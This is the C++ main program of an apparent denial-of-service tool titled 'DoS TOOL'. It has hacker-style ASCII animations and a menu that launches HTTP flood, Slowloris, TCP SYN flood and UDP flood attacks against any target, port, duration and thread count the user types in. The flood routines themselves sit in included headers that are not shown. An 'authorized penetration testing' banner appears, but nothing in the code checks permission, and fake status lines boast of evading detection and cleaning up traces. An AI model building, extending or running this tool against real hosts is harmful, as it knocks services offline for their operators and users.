#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <chrono>
#include <random>
#include <atomic>
#include <sstream>
#include <algorithm>
#include <functional>
#include <cstdlib>
#include <iomanip>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

#include "config.hpp"
#include "attacks/http_flood.hpp"
#include "attacks/slowloris.hpp"
#include "attacks/tcp_syn.hpp"
#include "attacks/udp_flood.hpp"

// ============================================================================
// ANSI Color Codes
// ============================================================================
namespace colors {
    const std::string RESET       = "\033[0m";
    const std::string BOLD        = "\033[1m";
    const std::string DIM         = "\033[2m";
    const std::string BLINK       = "\033[5m";

    const std::string RED         = "\033[31m";
    const std::string GREEN       = "\033[32m";
    const std::string YELLOW      = "\033[33m";
    const std::string BLUE        = "\033[34m";
    const std::string MAGENTA     = "\033[35m";
    const std::string CYAN        = "\033[36m";
    const std::string WHITE       = "\033[37m";

    const std::string BRIGHT_RED    = "\033[91m";
    const std::string BRIGHT_GREEN  = "\033[92m";
    const std::string BRIGHT_YELLOW = "\033[93m";
    const std::string BRIGHT_BLUE   = "\033[94m";
    const std::string BRIGHT_MAGENTA= "\033[95m";
    const std::string BRIGHT_CYAN   = "\033[96m";

    const std::string BG_BLACK    = "\033[40m";
    const std::string BG_RED      = "\033[41m";
    const std::string BG_GREEN    = "\033[42m";

    const std::vector<std::string> CYCLE = {
        BRIGHT_RED, BRIGHT_GREEN, BRIGHT_YELLOW,
        BRIGHT_BLUE, BRIGHT_MAGENTA, BRIGHT_CYAN
    };
}

// ============================================================================
// Hacker messages shown during attack
// ============================================================================
static const std::vector<std::string> HACKER_MESSAGES = {
    "[*] Bypassing firewall...",
    "[*] Injecting packets...",
    "[*] Rotating source addresses...",
    "[*] Amplifying traffic volume...",
    "[*] Saturating bandwidth...",
    "[*] Fragmenting packets...",
    "[*] Exhausting connection pool...",
    "[*] Overloading TCP stack...",
    "[*] Flooding request queue...",
    "[*] Consuming server resources...",
    "[*] Evading IDS detection...",
    "[*] Spoofing headers...",
    "[*] Distributing attack vectors...",
    "[*] Encrypting command channel...",
    "[*] Cycling attack patterns...",
    "[*] Adjusting payload entropy...",
    "[*] Nullroute evasion active...",
    "[*] Rotating user agents...",
    "[*] Randomizing TTL values...",
    "[*] Connection table overflow...",
};

// ============================================================================
// Utility functions
// ============================================================================
static std::mt19937& get_rng() {
    static std::mt19937 rng(std::random_device{}());
    return rng;
}

static void clear_screen() {
    std::cout << "\033[2J\033[H" << std::flush;
}

static void move_cursor(int row, int col) {
    std::cout << "\033[" << row << ";" << col << "H" << std::flush;
}

static void hide_cursor() {
    std::cout << "\033[?25l" << std::flush;
}

static void show_cursor() {
    std::cout << "\033[?25h" << std::flush;
}

static void sleep_ms(int ms) {
    std::this_thread::sleep_for(std::chrono::milliseconds(ms));
}

static std::string center_text(const std::string& text, int width) {
    if (static_cast<int>(text.size()) >= width) return text;
    int pad = (width - static_cast<int>(text.size())) / 2;
    return std::string(pad, ' ') + text;
}

// ============================================================================
// Matrix rain effect
// ============================================================================
static void matrix_rain(int duration_ms) {
    hide_cursor();
    const int WIDTH = 80;
    const int HEIGHT = 24;
    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?<>{}[]|/\\~^";

    auto& rng = get_rng();
    std::uniform_int_distribution<int> col_dist(0, WIDTH - 1);
    std::uniform_int_distribution<int> char_dist(0, static_cast<int>(chars.size()) - 1);
    std::uniform_int_distribution<int> row_dist(1, HEIGHT);

    auto start = std::chrono::steady_clock::now();

    while (true) {
        auto elapsed = std::chrono::steady_clock::now() - start;
        if (std::chrono::duration_cast<std::chrono::milliseconds>(elapsed).count() >= duration_ms) {
            break;
        }

        int col = col_dist(rng) + 1;
        int row = row_dist(rng);
        char c = chars[char_dist(rng)];

        // Random green shade
        std::uniform_int_distribution<int> shade(0, 2);
        int s = shade(rng);
        std::string color;
        if (s == 0) color = colors::GREEN;
        else if (s == 1) color = colors::BRIGHT_GREEN;
        else color = colors::DIM + colors::GREEN;

        move_cursor(row, col);
        std::cout << color << c << colors::RESET << std::flush;

        sleep_ms(5);
    }
    show_cursor();
}

// ============================================================================
// Glitch text effect
// ============================================================================
static void glitch_text(const std::string& text, const std::string& color, int iterations) {
    const std::string glitch_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`";
    auto& rng = get_rng();
    std::uniform_int_distribution<size_t> pos_dist(0, text.size() > 1 ? text.size() - 1 : 0);
    std::uniform_int_distribution<size_t> gc_dist(0, glitch_chars.size() - 1);
    std::uniform_int_distribution<size_t> color_dist(0, colors::CYCLE.size() - 1);

    for (int i = 0; i < iterations; i++) {
        std::string glitched = text;
        // Replace 1-3 characters with random glitch chars
        int num_glitches = (i % 3) + 1;
        for (int g = 0; g < num_glitches; g++) {
            size_t pos = pos_dist(rng);
            if (pos < glitched.size()) {
                glitched[pos] = glitch_chars[gc_dist(rng)];
            }
        }
        std::cout << "\r" << colors::CYCLE[color_dist(rng)] << colors::BOLD
                  << glitched << colors::RESET << std::flush;
        sleep_ms(50);
    }
    // Final clean text
    std::cout << "\r" << color << colors::BOLD << text << colors::RESET << std::endl;
}

// ============================================================================
// Type-out effect
// ============================================================================
static void type_text(const std::string& text, const std::string& color, int delay_ms = 20) {
    std::cout << color;
    for (char c : text) {
        std::cout << c << std::flush;
        sleep_ms(delay_ms);
    }
    std::cout << colors::RESET << std::endl;
}

// ============================================================================
// ASCII Art Banner
// ============================================================================
static void print_banner() {
    clear_screen();
    matrix_rain(1500);
    clear_screen();

    const std::vector<std::string> skull = {
        R"(                    ______                   )",
        R"(                 .-'      '-.                )",
        R"(                /            \               )",
        R"(               |              |              )",
        R"(               |,  .-.  .-.  ,|              )",
        R"(               | )(_o/  \o_)( |              )",
        R"(               |/     /\     \|              )",
        R"(               (_     ^^     _)              )",
        R"(                \__|IIIIII|__/               )",
        R"(                 | \IIIIII/ |                )",
        R"(                 \          /                )",
        R"(                  `--------`                 )",
    };

    // Print skull with color cycling
    for (size_t i = 0; i < skull.size(); i++) {
        std::string color = colors::CYCLE[i % colors::CYCLE.size()];
        std::cout << color << skull[i] << colors::RESET << std::endl;
        sleep_ms(50);
    }

    std::cout << std::endl;

    const std::vector<std::string> title = {
        R"( ____   ___  ____    _____ ___   ___  _     )",
        R"(|  _ \ / _ \/ ___|  |_   _/ _ \ / _ \| |    )",
        R"(| | | | | | \___ \    | || | | | | | | |    )",
        R"(| |_| | |_| |___) |   | || |_| | |_| | |___ )",
        R"(|____/ \___/|____/    |_| \___/ \___/|_____|)",
    };

    // Print title with glitch effect colors
    for (size_t i = 0; i < title.size(); i++) {
        std::string color = colors::BRIGHT_RED;
        if (i % 2 == 1) color = colors::BRIGHT_MAGENTA;
        std::cout << color << colors::BOLD << title[i] << colors::RESET << std::endl;
        sleep_ms(80);
    }

    std::cout << std::endl;
    std::string subtitle = ">>> AUTHORIZED PENETRATION TESTING TOOL <<<";
    glitch_text(center_text(subtitle, 50), colors::BRIGHT_CYAN, 15);

    std::string version = "[v2.0 C++ Edition]";
    std::cout << colors::DIM << colors::CYAN << center_text(version, 50) << colors::RESET << std::endl;

    std::cout << colors::YELLOW << colors::DIM;
    std::cout << "  ================================================" << std::endl;
    std::cout << "   WARNING: Unauthorized use is illegal. Only use  " << std::endl;
    std::cout << "   on systems you have permission to test.         " << std::endl;
    std::cout << "  ================================================" << std::endl;
    std::cout << colors::RESET << std::endl;
}

// ============================================================================
// Menu
// ============================================================================
static void print_menu() {
    std::cout << colors::BRIGHT_CYAN << colors::BOLD
              << "  +==========================================+" << std::endl;
    std::cout << "  |           SELECT ATTACK VECTOR           |" << std::endl;
    std::cout << "  +==========================================+" << colors::RESET << std::endl;
    std::cout << std::endl;

    std::cout << colors::BRIGHT_GREEN << "    [" << colors::BRIGHT_RED << "1" << colors::BRIGHT_GREEN
              << "] " << colors::WHITE << "HTTP Flood" << colors::DIM
              << "       - Overwhelm web server" << colors::RESET << std::endl;

    std::cout << colors::BRIGHT_GREEN << "    [" << colors::BRIGHT_RED << "2" << colors::BRIGHT_GREEN
              << "] " << colors::WHITE << "Slowloris" << colors::DIM
              << "        - Exhaust connections" << colors::RESET << std::endl;

    std::cout << colors::BRIGHT_GREEN << "    [" << colors::BRIGHT_RED << "3" << colors::BRIGHT_GREEN
              << "] " << colors::WHITE << "TCP SYN Flood" << colors::DIM
              << "    - Flood with SYN packets" << colors::RESET << std::endl;

    std::cout << colors::BRIGHT_GREEN << "    [" << colors::BRIGHT_RED << "4" << colors::BRIGHT_GREEN
              << "] " << colors::WHITE << "UDP Flood" << colors::DIM
              << "        - Saturate with UDP" << colors::RESET << std::endl;

    std::cout << std::endl;
    std::cout << colors::BRIGHT_GREEN << "    [" << colors::BRIGHT_YELLOW << "5" << colors::BRIGHT_GREEN
              << "] " << colors::YELLOW << "Exit" << colors::RESET << std::endl;

    std::cout << std::endl;
    std::cout << colors::BRIGHT_CYAN << "  +==========================================+" << colors::RESET << std::endl;
    std::cout << std::endl;
}

// ============================================================================
// Input helpers
// ============================================================================
static std::string prompt_input(const std::string& prompt, const std::string& default_val = "") {
    std::string display = prompt;
    if (!default_val.empty()) {
        display += colors::DIM + " [" + default_val + "]" + colors::RESET;
    }
    std::cout << colors::BRIGHT_GREEN << "  >> " << colors::WHITE << display
              << colors::BRIGHT_GREEN << " > " << colors::BRIGHT_CYAN;
    std::string input;
    std::getline(std::cin, input);
    std::cout << colors::RESET;
    if (input.empty() && !default_val.empty()) return default_val;
    return input;
}

static int prompt_int(const std::string& prompt, int default_val, int min_val, int max_val) {
    std::string result = prompt_input(prompt, std::to_string(default_val));
    try {
        int val = std::stoi(result);
        if (val < min_val) val = min_val;
        if (val > max_val) val = max_val;
        return val;
    } catch (...) {
        return default_val;
    }
}

// ============================================================================
// Target acquired animation
// ============================================================================
static void target_acquired_animation(const std::string& target, int port) {
    clear_screen();
    hide_cursor();

    std::string target_str = target + ":" + std::to_string(port);

    // Scanning lines effect
    for (int i = 0; i < 6; i++) {
        std::string color = (i % 2 == 0) ? colors::BRIGHT_RED : colors::RED;
        move_cursor(8, 1);
        std::cout << color << center_text("[SCANNING] " + target_str, 60) << colors::RESET << std::flush;
        sleep_ms(200);
        move_cursor(8, 1);
        std::cout << std::string(60, ' ') << std::flush;
        sleep_ms(100);
    }

    // Target acquired
    const std::vector<std::string> target_box = {
        "+============================================+",
        "|                                            |",
        "|          >>> TARGET ACQUIRED <<<            |",
        "|                                            |",
        "+============================================+",
    };

    move_cursor(6, 1);
    for (size_t i = 0; i < target_box.size(); i++) {
        std::cout << colors::BRIGHT_RED << colors::BOLD
                  << center_text(target_box[i], 60) << colors::RESET << std::endl;
        sleep_ms(100);
    }

    move_cursor(12, 1);
    std::cout << colors::BRIGHT_YELLOW << colors::BOLD
              << center_text("[ " + target_str + " ]", 60) << colors::RESET << std::endl;

    sleep_ms(1000);
    show_cursor();
}

// ============================================================================
// Countdown animation
// ============================================================================
static void countdown_animation() {
    hide_cursor();
    std::cout << std::endl;
    for (int i = 3; i > 0; i--) {
        std::string num = std::to_string(i);
        std::string color;
        if (i == 3) color = colors::BRIGHT_GREEN;
        else if (i == 2) color = colors::BRIGHT_YELLOW;
        else color = colors::BRIGHT_RED;

        // Large number display
        std::vector<std::string> big_nums;
        if (i == 3) {
            big_nums = {
                " _____ ",
                "|___ / ",
                "  |_ \\ ",
                " ___) |",
                "|____/ "
            };
        } else if (i == 2) {
            big_nums = {
                " ____  ",
                "|___ \\ ",
                "  __) |",
                " / __/ ",
                "|_____|"
            };
        } else {
            big_nums = {
                " _ ",
                "| |",
                "| |",
                "|_|",
                "   "
            };
        }

        for (auto& line : big_nums) {
            std::cout << color << colors::BOLD << center_text(line, 50) << colors::RESET << std::endl;
        }
        sleep_ms(600);

        // Clear the number
        for (size_t j = 0; j < big_nums.size(); j++) {
            std::cout << "\033[A\033[2K";
        }
    }

    // GO!
    glitch_text(center_text(">>> LAUNCHING ATTACK <<<", 50), colors::BRIGHT_RED, 20);
    std::cout << std::endl;
    show_cursor();
}

// ============================================================================
// Live stats display
// ============================================================================
static void display_attack_stats(const std::string& attack_type,
                                 const std::string& target,
                                 int elapsed_seconds,
                                 int total_duration,
                                 const std::string& status_line) {
    // Progress bar
    int progress = (total_duration > 0) ? (elapsed_seconds * 40 / total_duration) : 0;
    if (progress > 40) progress = 40;

    std::string bar = "[";
    for (int i = 0; i < 40; i++) {
        if (i < progress) bar += "#";
        else bar += "-";
    }
    bar += "]";

    int pct = (total_duration > 0) ? (elapsed_seconds * 100 / total_duration) : 0;
    if (pct > 100) pct = 100;

    std::cout << "\r" << colors::BRIGHT_CYAN << "  " << attack_type << " "
              << colors::BRIGHT_GREEN << bar << " "
              << colors::BRIGHT_YELLOW << pct << "% "
              << colors::DIM << "(" << elapsed_seconds << "s/" << total_duration << "s) "
              << colors::RESET << std::flush;

    // Status line on next line
    std::cout << std::endl << "\r" << colors::GREEN << "  " << status_line
              << "                    " << colors::RESET << std::flush;
    // Move cursor back up
    std::cout << "\033[A" << std::flush;
}

// ============================================================================
// Print final results
// ============================================================================
static void print_results(const std::map<std::string, std::string>& stats) {
    std::cout << std::endl << std::endl << std::endl;

    std::cout << colors::BRIGHT_CYAN << colors::BOLD
              << "  +==========================================+" << std::endl;
    std::cout << "  |            ATTACK RESULTS                |" << std::endl;
    std::cout << "  +==========================================+" << colors::RESET << std::endl;

    for (auto& [key, value] : stats) {
        // Format key: replace underscores with spaces and capitalize
        std::string label = key;
        std::replace(label.begin(), label.end(), '_', ' ');
        if (!label.empty()) label[0] = static_cast<char>(toupper(label[0]));

        std::cout << colors::BRIGHT_GREEN << "    " << std::left << std::setw(22)
                  << label << colors::WHITE << ": " << colors::BRIGHT_YELLOW
                  << value << colors::RESET << std::endl;
    }

    std::cout << colors::BRIGHT_CYAN << colors::BOLD
              << "  +==========================================+" << colors::RESET << std::endl;
    std::cout << std::endl;
}

// ============================================================================
// Winsock initialization
// ============================================================================
#ifdef _WIN32
class WinsockInit {
public:
    WinsockInit() {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
    }
    ~WinsockInit() {
        WSACleanup();
    }
};
#endif

// ============================================================================
// Enable ANSI on Windows
// ============================================================================
static void enable_ansi() {
#ifdef _WIN32
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD dwMode = 0;
        if (GetConsoleMode(hOut, &dwMode)) {
            dwMode |= 0x0004; // ENABLE_VIRTUAL_TERMINAL_PROCESSING
            SetConsoleMode(hOut, dwMode);
        }
    }
#endif
}

// ============================================================================
// Run attack flow
// ============================================================================
static void run_attack(int choice) {
    std::string attack_name;
    switch (choice) {
        case 1: attack_name = "HTTP Flood"; break;
        case 2: attack_name = "Slowloris"; break;
        case 3: attack_name = "TCP SYN Flood"; break;
        case 4: attack_name = "UDP Flood"; break;
        default: return;
    }

    std::cout << std::endl;
    std::cout << colors::BRIGHT_RED << colors::BOLD
              << "  [" << attack_name << " Selected]" << colors::RESET << std::endl;
    std::cout << std::endl;

    // Get target
    std::string target = prompt_input("Target (IP or domain)");
    if (target.empty()) {
        std::cout << colors::RED << "  [!] Target is required." << colors::RESET << std::endl;
        return;
    }

    // Get port
    int port = prompt_int("Port", config::DEFAULT_PORT, 1, 65535);

    // Get duration
    int duration = prompt_int("Duration (seconds)", config::DEFAULT_DURATION, 1, config::MAX_DURATION_SECONDS);

    // Get threads
    int threads = prompt_int("Threads", config::DEFAULT_THREADS, 1, config::MAX_THREADS);

    // Payload size for UDP
    int payload_size = 1024;
    if (choice == 4) {
        payload_size = prompt_int("Payload size (bytes)", 1024, 1, 65507);
    }

    // Target acquired animation
    target_acquired_animation(target, port);

    // Countdown
    std::cout << std::endl;
    countdown_animation();

    // Callback for status messages
    auto callback = [](const std::string& msg) {
        std::cout << colors::GREEN << "  " << msg << colors::RESET << std::endl;
    };

    // Live stats monitor
    std::atomic<bool> attack_done{false};
    auto& rng = get_rng();
    std::uniform_int_distribution<size_t> msg_dist(0, HACKER_MESSAGES.size() - 1);

    auto stats_thread = std::thread([&]() {
        auto start = std::chrono::steady_clock::now();
        int msg_counter = 0;
        while (!attack_done.load()) {
            auto elapsed = std::chrono::steady_clock::now() - start;
            int secs = static_cast<int>(std::chrono::duration_cast<std::chrono::seconds>(elapsed).count());

            std::string status = HACKER_MESSAGES[msg_dist(rng)];
            display_attack_stats(attack_name, target, secs, duration, status);

            sleep_ms(500);
            msg_counter++;
        }
    });

    // Run the attack
    std::map<std::string, std::string> stats;

    switch (choice) {
        case 1: {
            HTTPFlood attack(target, duration, threads, port, callback);
            stats = attack.run();
            break;
        }
        case 2: {
            Slowloris attack(target, duration, threads, port, callback);
            stats = attack.run();
            break;
        }
        case 3: {
            TCPSYNFlood attack(target, duration, threads, port, callback);
            stats = attack.run();
            break;
        }
        case 4: {
            UDPFlood attack(target, duration, threads, port, payload_size, callback);
            stats = attack.run();
            break;
        }
    }

    attack_done.store(true);
    if (stats_thread.joinable()) {
        stats_thread.join();
    }

    // Print results
    print_results(stats);

    std::cout << colors::DIM << "  Press Enter to return to menu..." << colors::RESET;
    std::string dummy;
    std::getline(std::cin, dummy);
}

// ============================================================================
// Main
// ============================================================================
int main() {
    enable_ansi();

#ifdef _WIN32
    WinsockInit winsock;
#endif

    while (true) {
        print_banner();
        print_menu();

        std::string choice_str = prompt_input("Select option");

        int choice = 0;
        try {
            choice = std::stoi(choice_str);
        } catch (...) {
            std::cout << colors::RED << "  [!] Invalid option." << colors::RESET << std::endl;
            sleep_ms(1000);
            continue;
        }

        if (choice == 5) {
            clear_screen();
            hide_cursor();

            // Exit animation
            const std::vector<std::string> goodbye = {
                R"(   ____                 _ _                _ )",
                R"(  / ___| ___   ___   __| | |__  _   _  ___| |)",
                R"( | |  _ / _ \ / _ \ / _` | '_ \| | | |/ _ \ |)",
                R"( | |_| | (_) | (_) | (_| | |_) | |_| |  __/_|)",
                R"(  \____|\___/ \___/ \__,_|_.__/ \__, |\___(_))",
                R"(                                |___/         )",
            };

            std::cout << std::endl;
            for (auto& line : goodbye) {
                std::cout << colors::BRIGHT_RED << line << colors::RESET << std::endl;
                sleep_ms(80);
            }

            std::cout << std::endl;
            type_text("  [*] Cleaning up traces...", colors::GREEN, 30);
            sleep_ms(300);
            type_text("  [*] Destroying session keys...", colors::GREEN, 30);
            sleep_ms(300);
            type_text("  [*] Connection terminated.", colors::RED, 30);
            sleep_ms(500);

            show_cursor();
            std::cout << colors::RESET << std::endl;
            return 0;
        }

        if (choice >= 1 && choice <= 4) {
            run_attack(choice);
        } else {
            std::cout << colors::RED << "  [!] Invalid option. Choose 1-5." << colors::RESET << std::endl;
            sleep_ms(1000);
        }
    }

    return 0;
}
